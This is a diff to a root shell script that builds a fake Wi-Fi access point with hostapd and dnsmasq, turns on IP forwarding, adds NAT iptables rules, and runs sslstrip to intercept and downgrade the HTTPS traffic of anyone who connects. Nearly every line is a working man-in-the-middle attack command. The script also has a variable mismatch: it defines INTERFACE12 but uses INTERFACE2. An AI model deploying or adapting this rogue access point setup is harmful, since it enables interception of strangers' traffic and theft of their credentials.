@@ -5,6 +5,7 @@ Exit() {
   echo "Cleaning up stuff..."
   killall hostapd
   killall sslstrip
+  killall dnsmasq
   stop_service "nginx"
   start_service "NetworkManager"
   exit
@@ -18,6 +19,8 @@ if [ "$EUID" -ne 0 ]
 fi
 
 SSLSTRIP_PORT=10000
+INTERFACE1="enp1s0f1"
+INTERFACE12="wlp2s0"
 
 detect_init() {
   # init process is pid 1
@@ -142,10 +145,33 @@ echo "Starting sslstrip"
 nohup sslstrip --listen=$SSLSTRIP_PORT &>/dev/null &
 echo "Stopping NetworkManager"
 stop_service "NetworkManager"
-echo "Setting up FakeAP using hostapd..."
-nohup hostapd -B -d hostapd.conf &>/dev/null &
+
+nmcli nm wifi off
+rfkill unblock wlan
+
+ifconfig $INTERFACE1 down
+ifconfig $INTERFACE2 up
+ifconfig $INTERFACE1 192.168.0.1 netmask 255.255.255.0 up
+ifconfig $INTERFACE2 192.168.0.100 netmask 255.255.255.0 up
+
+echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
+
+iptables --flush
+iptables --table nat --flush
+iptables --delete-chain
+iptables --table nat --delete-chain
+iptables --table nat --append POSTROUTING --out-interface $INTERFACE2 -j MASQUERADE
+iptables --append FORWARD --in-interface $INTERFACE1 -j ACCEPT
+iptables -t nat -A POSTROUTING -j MASQUERADE
+iptables -A FORWARD -i $INTERFACE1 -o $INTERFACE2 -m state --state RELATED,ESTABLISHED -j ACCEPT
+iptables -A FORWARD -i $INTERFACE2 -o $INTERFACE1 -j ACCEPT
+
+sysctl -w net.ipv4.ip_forward=1
+
 echo "Launching DHCP + DNS Server dnsmasq..."
-nohup dnsmasq -C dnsmasq.conf &>/dev/null &
+dnsmasq -C dnsmasq.conf &>/dev/null &
+echo "Setting up FakeAP using hostapd..."
+hostapd -B -d hostapd.conf &
 
 read -p "Script is running press any key to cancel..."
 
